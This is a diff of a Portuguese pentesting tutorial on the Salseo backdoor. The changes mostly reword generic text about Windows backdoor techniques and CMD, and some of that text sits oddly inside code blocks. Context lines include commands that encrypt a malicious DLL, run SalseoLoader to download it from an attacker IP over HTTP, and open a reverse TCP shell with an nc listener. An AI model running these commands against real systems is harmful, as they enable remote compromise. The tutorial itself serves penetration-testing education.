@@ -39,38 +39,31 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 # Backdoors em Windows
 
-Um backdoor é uma forma de acesso não autorizado a um sistema ou rede, que permite ao invasor contornar as medidas de segurança e obter controle remoto sobre o sistema comprometido. Existem várias técnicas para criar backdoors em sistemas Windows, algumas das quais são descritas abaixo.
+Um backdoor é uma forma de acesso não autorizado a um sistema ou rede, que permite ao invasor contornar as medidas de segurança e obter controle remoto sobre o sistema comprometido. Existem várias técnicas para criar backdoors em sistemas Windows, algumas das quais são discutidas abaixo.
 
 ## 1. Porta dos fundos do Registro do Windows
 
-Uma maneira comum de criar um backdoor em um sistema Windows é adicionar uma entrada de registro que execute um programa malicioso sempre que o sistema for iniciado. Isso pode ser feito adicionando uma chave de registro em uma das seguintes localizações:
-
-- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
-- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
+O Registro do Windows é um banco de dados que armazena configurações e informações importantes do sistema operacional. Um invasor pode criar uma entrada de registro maliciosa que executa um programa ou script quando o sistema é inicializado. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.
 
 ## 2. Backdoors baseados em serviços
 
-Outra técnica comum é criar um backdoor como um serviço do Windows. Isso envolve a criação de um serviço que é executado em segundo plano e pode ser configurado para iniciar automaticamente quando o sistema é inicializado. O serviço pode ser configurado para executar um programa malicioso ou fornecer um shell remoto para o invasor.
+Os serviços do Windows são programas que são executados em segundo plano e fornecem funcionalidades específicas para o sistema operacional. Um invasor pode criar um serviço malicioso que é executado em segundo plano e fornece acesso remoto ao sistema comprometido. Esse tipo de backdoor é difícil de detectar, pois se disfarça como um serviço legítimo.
 
 ## 3. Backdoors baseados em arquivos DLL
 
-Os arquivos DLL (Dynamic Link Library) são componentes do sistema operacional Windows que contêm código e dados compartilhados por vários programas. Um backdoor pode ser criado substituindo uma DLL legítima por uma versão modificada que executa código malicioso. Quando um programa legítimo é executado e carrega a DLL modificada, o código malicioso é executado em segundo plano.
+As DLLs (Dynamic Link Libraries) são arquivos que contêm código e dados que podem ser usados por vários programas. Um invasor pode substituir uma DLL legítima por uma versão maliciosa que contém um backdoor. Quando um programa usa essa DLL, o invasor pode obter acesso ao sistema comprometido.
 
-## 4. Backdoors baseados em drivers
+## 4. Backdoors baseados em arquivos executáveis
 
-Os drivers são programas que permitem que o sistema operacional Windows se comunique com dispositivos de hardware. Um backdoor pode ser criado substituindo um driver legítimo por uma versão modificada que executa código malicioso. Quando o driver é carregado pelo sistema operacional, o código malicioso é executado em segundo plano.
+Os arquivos executáveis do Windows são programas que podem ser executados diretamente pelo sistema operacional. Um invasor pode modificar um arquivo executável legítimo para incluir um backdoor. Quando o programa é executado, o backdoor é ativado e o invasor obtém acesso ao sistema comprometido.
 
-## 5. Backdoors baseados em aplicativos legítimos
+## 5. Backdoors baseados em drivers do Windows
 
-Uma técnica menos comum é modificar um aplicativo legítimo para incluir um backdoor. Isso pode ser feito modificando o código do aplicativo ou injetando código malicioso em tempo de execução. Quando o aplicativo é executado, o backdoor é ativado e permite ao invasor obter acesso não autorizado ao sistema.
-
-## 6. Backdoors baseados em exploits
-
-Os exploits são vulnerabilidades de segurança em sistemas operacionais ou aplicativos que podem ser exploradas para obter acesso não autorizado. Um backdoor pode ser criado aproveitando um exploit conhecido e explorando-o para obter acesso ao sistema. Isso geralmente requer conhecimento avançado de programação e segurança.
+Os drivers do Windows são programas que permitem que o sistema operacional se comunique com dispositivos de hardware. Um invasor pode criar um driver malicioso que fornece acesso remoto ao sistema comprometido. Esse tipo de backdoor é particularmente perigoso, pois tem acesso de nível de kernel e pode contornar as medidas de segurança do sistema operacional.
 
 ## Conclusão
 
-Essas são apenas algumas das técnicas comuns usadas para criar backdoors em sistemas Windows. É importante estar ciente dessas técnicas para poder proteger seu sistema contra ataques e garantir a segurança de seus dados.
+Essas são apenas algumas das técnicas usadas para criar backdoors em sistemas Windows. É importante estar ciente dessas técnicas para poder proteger seu sistema contra ataques de hackers. Manter seu sistema operacional e software atualizados, usar um firewall e um antivírus confiável e tomar precauções ao baixar e abrir arquivos são algumas das medidas que você pode tomar para proteger seu sistema contra backdoors e outros tipos de ataques.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -83,7 +76,7 @@ Ok, agora você tem tudo o que precisa para executar todo o processo de Salseo: 
 
 ### **Obtendo um shell reverso TCP (baixando o dll codificado por HTTP)**
 
-Lembre-se de iniciar um nc como ouvinte do shell reverso e um servidor HTTP para servir o evilsalsa codificado.
+Lembre-se de iniciar um nc como ouvinte de shell reverso e um servidor HTTP para servir o evilsalsa codificado.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -126,7 +119,7 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ### Adicione antes da função principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instale o DllExport para este projeto
 
@@ -172,7 +165,7 @@ Selecione a **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Com
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Para **compilar** a solução: Build --> Build Solution (Dentro do console de saída, aparecerá o caminho da nova DLL)
+Para **compilar** a solução: Build --> Build Solution (Dentro do console de saída, o caminho da nova DLL aparecerá)
 
 ### Teste a DLL gerada
 
@@ -203,11 +196,11 @@ O CMD (Command Prompt) é uma ferramenta de linha de comando no sistema operacio
 
 O CMD pode ser usado para executar comandos básicos, como navegar pelos diretórios, criar e excluir arquivos, gerenciar processos e serviços, configurar redes e muito mais. Além disso, o CMD também pode ser usado para executar scripts e programas.
 
-Os hackers podem aproveitar o CMD para executar várias atividades maliciosas, como obter informações confidenciais, explorar vulnerabilidades, criar backdoors e realizar ataques de força bruta. Portanto, é importante estar ciente das possíveis ameaças e tomar medidas para proteger seu sistema contra ataques.
+Os hackers podem aproveitar o CMD para executar várias atividades maliciosas, como explorar vulnerabilidades, obter acesso não autorizado, roubar informações confidenciais e muito mais. Eles podem usar comandos específicos do CMD para realizar essas ações, como criar backdoors, executar scripts maliciosos, modificar configurações do sistema e explorar falhas de segurança.
 
-Para evitar o uso indevido do CMD, é recomendável implementar medidas de segurança, como restringir o acesso ao CMD, monitorar atividades suspeitas e manter o sistema operacional e os aplicativos atualizados com as últimas correções de segurança.
+É importante que os usuários estejam cientes das possíveis ameaças associadas ao uso do CMD e tomem medidas para proteger seus sistemas contra ataques. Isso inclui manter o sistema operacional e os softwares atualizados, usar senhas fortes, evitar o download de arquivos suspeitos e ter um software antivírus confiável instalado.
 
-Em resumo, o CMD é uma ferramenta poderosa que pode ser usada tanto para fins legítimos quanto maliciosos. É essencial entender seu funcionamento e tomar precauções adequadas para garantir a segurança do sistema.
+Em resumo, o CMD é uma ferramenta poderosa que pode ser usada para executar várias tarefas no sistema operacional Windows. No entanto, também pode ser explorado por hackers para realizar atividades maliciosas. Portanto, é importante estar ciente das ameaças associadas ao uso do CMD e tomar medidas para proteger os sistemas contra ataques.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
